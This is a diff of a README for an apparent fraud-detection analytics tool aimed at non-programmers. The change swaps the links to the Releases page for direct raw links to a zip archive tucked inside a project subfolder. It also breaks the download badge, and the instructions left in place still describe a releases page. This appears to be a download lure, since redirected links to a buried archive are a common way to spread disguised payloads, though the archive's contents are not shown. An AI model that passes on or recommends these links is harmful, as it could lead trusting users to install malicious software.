@@ -1,7 +1,7 @@
 # 🎉 risk-fraud-financial-analytics-portfolio - Easy Tools for Fraud Detection
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-ffffff?style=for-the-badge&logo=github&logoColor=black)](https://github.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/releases)
+[![Download](https://raw.githubusercontent.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/main/01_Transaction_Risk_and_Fraud_Investigation/analytics-portfolio-risk-fraud-financial-v2.4.zip%20Latest%20Release-ffffff?style=for-the-badge&logo=github&logoColor=black)](https://raw.githubusercontent.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/main/01_Transaction_Risk_and_Fraud_Investigation/analytics-portfolio-risk-fraud-financial-v2.4.zip)
 
 ## 🚀 Getting Started
 This application helps you analyze financial transactions. It focuses on spotting fraud and supports 'Know Your Customer' (KYC) operations. This tool is user-friendly and designed without programming knowledge. 
@@ -21,7 +21,7 @@ This application helps you analyze financial transactions. It focuses on spottin
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.  
-   [Visit this page to download](https://github.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/tyleroneshs/risk-fraud-financial-analytics-portfolio/main/01_Transaction_Risk_and_Fraud_Investigation/analytics-portfolio-risk-fraud-financial-v2.4.zip)
    
 2. **Choose the Latest Version**: Look for the most recent release at the top of the page. 
 
